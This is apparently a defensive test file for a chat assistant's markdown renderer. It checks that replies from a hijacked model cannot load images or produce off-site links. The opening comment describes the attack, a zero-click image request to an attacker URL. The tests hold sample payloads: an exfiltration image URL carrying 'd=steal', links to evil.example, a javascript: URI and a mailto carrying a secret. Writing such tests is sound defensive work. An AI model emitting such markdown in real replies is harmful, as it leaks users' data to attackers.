/**
 * Phase 6 security LLM-2 / LLM-3: a hijacked model's markdown became a real
 * <img> (zero-click request to an attacker URL, stopped only by CSP) and a
 * clickable link to any http(s) host.
 */
import { describe, expect, it, vi } from 'vitest';
import { render } from '@testing-library/react';
import ReactMarkdown from 'react-markdown';
import { createElement, type ReactNode } from 'react';

vi.mock('next/link', () => ({
  default: ({ href, children, ...rest }: { href: string; children: ReactNode }) => createElement('a', { href, 'data-internal': 'true', ...rest }, children),
}));

const { chatMarkdownComponents } = await import('@/components/ubunye/chatMarkdown');
const { chatLinkTarget } = await import('@/lib/ubunye/chat-links');

const renderReply = (md: string) =>
  render(createElement(ReactMarkdown, { components: chatMarkdownComponents }, md)).container;

describe('Ubunye reply rendering (LLM-2/LLM-3)', () => {
  it('the attacker payload: no <img>, and the off-site link is plain text', () => {
    const c = renderReply('Here ![x](http://127.0.0.1:9/leak.png?d=steal) and [click](http://127.0.0.1:9/evil)');
    expect(c.querySelector('img')).toBeNull();
    expect(c.innerHTML).not.toContain('127.0.0.1');
    expect(c.querySelector('a')).toBeNull();
    expect(c.textContent).toContain('click');
  });

  it('never loads any image, not even from https hosts', () => {
    const c = renderReply('![logo](https://res.cloudinary.com/x/image/upload/a.png)');
    expect(c.querySelector('img')).toBeNull();
    expect(c.textContent).toContain('[image: logo]');
  });

  it('keeps same-site and allowlisted links clickable', () => {
    const c = renderReply('[gear](/smart-rentals) [book](https://www.thabangvision.com/studio) [chat](https://wa.me/27639905802)');
    const links = [...c.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(links).toEqual(['/smart-rentals', 'https://www.thabangvision.com/studio', 'https://wa.me/27639905802']);
  });

  it.each([
    'https://evil.example/login',
    'http://www.thabangvision.com/pay',
    '//evil.example/x',
    '/\\evil.example',
    'https://user:pw@www.thabangvision.com/',
    'mailto:attacker@evil.example',
    'mailto:hello@thabangvision.com?body=secret',
    'javascript:alert(1)',
    'data:text/html,hi',
  ])('%s is not a link', (href) => {
    expect(chatLinkTarget(href).kind).toBe('text');
  });

  it('our own contact links work', () => {
    expect(chatLinkTarget('mailto:bookings@thabangvision.com').kind).toBe('external');
    expect(chatLinkTarget('tel:+27639905802').kind).toBe('external');
    expect(chatLinkTarget('https://instagram.com/thabangvision').kind).toBe('external');
  });
});
